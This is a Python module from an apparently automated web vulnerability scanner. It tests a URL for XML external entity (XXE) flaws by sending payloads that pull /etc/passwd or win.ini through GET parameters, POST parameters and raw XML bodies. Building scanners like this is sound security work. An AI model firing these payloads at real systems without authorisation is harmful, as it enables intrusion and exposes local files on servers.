from app.engine.modules.base import BaseVulnerability
import urllib.parse

class XXEModule(BaseVulnerability):
    async def check(self, url, method, param, scan_id):
        # Basic XXE payloads
        payloads = [
            """<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>""",
            """<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///c:/windows/win.ini" >]><foo>&xxe;</foo>"""
        ]

        for payload in payloads:
            # XXE is usually POST body, but sometimes param value
            
            # 1. Try as param value
            target_url = url
            if method == "GET":
                encoded = urllib.parse.quote(payload)
                if "?" in url:
                    target_url = f"{url}&{param}={encoded}"
                else:
                    target_url = f"{url}?{param}={encoded}"
                
                try:
                    async with self.session.get(target_url, allow_redirects=False) as resp:
                        text = await resp.text()
                        if "root:x:0:0" in text or "[extensions]" in text:
                            self.report(scan_id, "XXE Detected", "Critical", target_url, payload, "Server processed XML Entity and returned local file.")
                            return
                except:
                    pass

            elif method == "POST":
                # 2. Try replacing the whole body if it looks like XML, or just the param
                # Case A: Param
                data = {param: payload}
                try:
                    async with self.session.post(url, data=data, allow_redirects=False) as resp:
                        text = await resp.text()
                        if "root:x:0:0" in text or "[extensions]" in text:
                            self.report(scan_id, "XXE Detected", "Critical", url, payload, "Server processed XML Entity and returned local file.")
                            return
                except:
                    pass
                
                # Case B: Raw Body (if param name suggests body or is empty)
                try:
                    async with self.session.post(url, data=payload, headers={'Content-Type': 'application/xml'}, allow_redirects=False) as resp:
                        text = await resp.text()
                        if "root:x:0:0" in text or "[extensions]" in text:
                            self.report(scan_id, "XXE Detected", "Critical", url, payload, "Server processed XML Entity and returned local file.")
                            return
                except:
                    pass
